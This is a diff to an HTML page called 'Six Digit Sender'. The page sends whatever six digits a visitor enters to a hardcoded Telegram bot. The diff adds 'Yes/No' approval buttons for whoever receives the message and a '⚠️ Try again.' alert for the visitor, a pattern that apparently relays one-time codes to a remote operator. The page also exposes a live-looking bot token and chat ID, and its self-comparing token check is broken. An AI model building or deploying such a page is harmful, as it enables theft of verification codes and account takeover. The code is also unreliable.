@@ -17,16 +17,16 @@
       display: flex;
       align-items: center;
       justify-content: center;
+      padding: 20px;
       font-family: Arial, sans-serif;
       background: linear-gradient(135deg, #101828, #243b55);
-      padding: 20px;
     }
 
     .card {
       width: 100%;
       max-width: 380px;
-      background: #ffffff;
       padding: 30px 24px;
+      background: white;
       border-radius: 18px;
       box-shadow: 0 15px 40px #0004;
       text-align: center;
@@ -95,6 +95,16 @@
       font-size: 14px;
     }
 
+    #warning {
+      display: none;
+      margin-top: 14px;
+      padding: 12px;
+      border-radius: 8px;
+      color: #b42318;
+      background: #fee4e2;
+      font-size: 14px;
+    }
+
     .footer {
       margin-top: 20px;
       font-size: 12px;
@@ -108,7 +118,7 @@
     <div class="logo">📩</div>
 
     <h2>Six Digit Sender</h2>
-    <p>Enter six digits and submit them.</p>
+    <p>Enter six digits and submit.</p>
 
     <form id="numberForm">
       <input
@@ -131,11 +141,14 @@
 
     <div id="status" role="status" aria-live="polite"></div>
 
+    <div id="warning" role="alert">
+      ⚠️ Try again.
+    </div>
+
     <div class="footer">Six Digit Sender</div>
   </main>
 
   <script>
-    // Enter your Telegram bot details here.
     const BOT_TOKEN = "8882512901:AAELOm0vWyxR9OC03g8_ZgJrPfPTHGIayRE";
     const CHAT_ID = "7479503756";
 
@@ -143,12 +156,20 @@
     const digitsInput = document.getElementById("digits");
     const submitBtn = document.getElementById("submitBtn");
     const status = document.getElementById("status");
+    const warning = document.getElementById("warning");
 
     digitsInput.addEventListener("input", () => {
       digitsInput.value = digitsInput.value
         .replace(/\D/g, "")
         .slice(0, 6);
+
+      warning.style.display = "none";
     });
+
+    function showTryAgainWarning() {
+      warning.style.display = "block";
+      warning.textContent = "⚠️ Try again.";
+    }
 
     form.addEventListener("submit", async (event) => {
       event.preventDefault();
@@ -156,16 +177,13 @@
       const digits = digitsInput.value;
 
       if (!/^\d{6}$/.test(digits)) {
-        status.textContent = "Please enter exactly six digits.";
+        status.textContent = "Enter exactly six digits.";
         status.style.color = "#d92d20";
         return;
       }
 
-      if (
-        BOT_TOKEN === "8882512901:AAELOm0vWyxR9OC03g8_ZgJrPfPTHGIayRE" ||
-        CHAT_ID === "7479503756"
-      ) {
-        status.textContent = "Configure your bot token and chat ID first.";
+      if (BOT_TOKEN === "8882512901:AAELOm0vWyxR9OC03g8_ZgJrPfPTHGIayRE") {
+        status.textContent = "Configure your bot token first.";
         status.style.color = "#d92d20";
         return;
       }
@@ -173,6 +191,7 @@
       submitBtn.disabled = true;
       submitBtn.textContent = "Sending...";
       status.textContent = "";
+      warning.style.display = "none";
 
       try {
         const response = await fetch(
@@ -184,7 +203,21 @@
             },
             body: JSON.stringify({
               chat_id: CHAT_ID,
-              text: `Six-digit submission: ${digits}`
+              text: `Six-digit submission: ${digits}`,
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    {
+                      text: "✅ Yes",
+                      callback_data: "yes"
+                    },
+                    {
+                      text: "❌ No",
+                      callback_data: "no"
+                    }
+                  ]
+                ]
+              }
             })
           }
         );
@@ -192,16 +225,16 @@
         const result = await response.json();
 
         if (!response.ok || !result.ok) {
-          throw new Error("Telegram rejected the request.");
+          throw new Error("Telegram request failed");
         }
 
-        status.textContent = "Sent successfully!";
+        status.textContent = "Message sent to Telegram.";
         status.style.color = "#039855";
         form.reset();
 
       } catch (error) {
         status.textContent =
-          "Unable to send. Check your bot details and connection.";
+          "Unable to send. Check your connection and bot settings.";
         status.style.color = "#d92d20";
       } finally {
         submitBtn.disabled = false;
@@ -211,5 +244,3 @@
   </script>
 </body>
 </html>
-
-
